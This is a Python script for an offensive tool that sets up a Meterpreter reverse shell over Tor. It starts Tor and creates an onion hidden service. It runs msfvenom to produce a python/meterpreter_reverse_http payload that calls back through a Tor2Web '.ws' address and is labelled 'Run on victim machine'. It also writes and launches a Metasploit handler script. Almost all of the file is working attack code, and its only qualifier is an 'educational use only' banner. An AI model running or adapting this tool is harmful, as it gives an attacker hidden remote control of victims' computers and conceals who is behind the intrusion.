# -*- coding: utf-8 -*-
# Author: calfcrusher@inventati.org

import os
import shutil
import signal
import subprocess
import time

from stem.control import Controller
from termcolor import colored
from subprocess import check_output


def generatebatch():
    """Generate metasploit batch .rc file"""

    with open('msfconsole.rc', 'w') as f:
        f.write("use exploit/multi/handler\n")
        f.write("set PAYLOAD python/meterpreter_reverse_http\n")
        f.write("set LHOST 127.0.0.1\n")
        f.write("set LPORT 5000\n")
        f.write("exploit -jz\n")

    print(" * batch file generated in " + os.getcwd() + "/msfconsole.rc")
    print('\n')
    # Asking for valid response
    while True:
        response = input("[!] Start msfconsole now? [yes/no] ")
        if not response.isalpha():
            continue
        if response == 'yes' or response == 'no':
            break

    if response == 'yes':
        subprocess.Popen(['xterm', '-e', 'msfconsole -q -r msfconsole.rc'])


def generatepayload(hostname):
    """Generating msfvenom python nostaged payload"""

    # Check if msfvenom is installed
    rc = subprocess.call(['which', 'msfvenom'], stdout=subprocess.PIPE)
    if rc:
        print('\n')
        print('[!] Unable to find msfvenom! Exiting..')
        exit(0)
    print(" * Generating msfvenom python/meterpreter_reverse_http payload..")
    print('\n')
    # Append .ws Tor2Web extension
    lhost = hostname + ".ws"
    # Generate payload
    payload = "msfvenom -p python/meterpreter_reverse_http LHOST=" + lhost + " LPORT=80 > payload.py"
    subprocess.call(payload, stdout=subprocess.PIPE, shell=True)
    print(" * payload generated in " + os.getcwd() + "/payload.py - Run on victim machine")


def stem():
    """Start hidden service"""

    # Check if tor is installed
    rc = subprocess.call(['which', 'tor'], stdout=subprocess.PIPE)
    if rc:
        print('\n')
        print('[!] Unable to find tor! Exiting..')
        exit(0)
    else:
        # Start tor
        print(' * Starting tor network..')
        os.system("tor --quiet &")

    # Give some time to start tor circuit..
    time.sleep(6)

    with Controller.from_port() as controller:
        controller.authenticate()
        # Create a directory for hidden service
        hidden_service_dir = os.path.join(controller.get_conf('DataDirectory', os.getcwd()), 'hidden_service_data')

        # Create a hidden service where visitors of port 80 get redirected to local
        # port 5000
        try:
            print(" * Creating hidden service in %s" % hidden_service_dir)
            result = controller.create_hidden_service(hidden_service_dir, 80, target_port=5000)
        except:
            print("[!] Unable to connect ! Is tor running and dir writable? Exiting..")
            exit(0)

        # The hostname is only available when we can read the hidden service
        # directory. This requires us to be running with the same user as tor process.
        if result.hostname:
            print(" * Service is available at %s redirecting to local port 5000" % result.hostname)
            # Generate payload
            generatepayload(result.hostname)
            # Generate metasploit batch file
            generatebatch()
            print('\n')
        else:
            print(
                "* Unable to determine our service's hostname, probably due to being unable to read the hidden "
                "service directory. Exiting..")
            exit(0)

        try:
            input("\x1b[6;30;42m * RUNNING - <enter> to quit\x1b[0m")
        finally:
            # Shut down the hidden service and clean it off disk. Note that you *don't*
            # want to delete the hidden service directory if you'd like to have this
            # same *.onion address in the future.
            print(" * Shutting down hidden service and clean it off disk")
            controller.remove_hidden_service(hidden_service_dir)
            shutil.rmtree(hidden_service_dir)
            print(" * Shutting down tor")
            os.kill(int(check_output(["pidof", "tor"])), signal.SIGTERM)


def main():
    """Main function of tool"""

    print("""\033[91m


            ██████╗░░█████╗░██╗░█████╗░███╗░░██╗░█████╗░
            ██╔══██╗██╔══██╗██║██╔══██╗████╗░██║██╔══██╗
            ██████╔╝██║░░██║██║███████║██╔██╗██║███████║
            ██╔═══╝░██║░░██║██║██╔══██║██║╚████║██╔══██║
            ██║░░░░░╚█████╔╝██║██║░░██║██║░╚███║██║░░██║
            ╚═╝░░░░░░╚════╝░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝
    \x1b[0m""")

    print(colored("\tMeterpreter Reverse shell on TOR using hidden services", 'red'))
    print(colored("\tcalfcrusher@inventati.org | For educational use only", 'red'))
    print('\n')

    time.sleep(2)
    stem()


if __name__ == "__main__":
    os.system('clear')
    main()
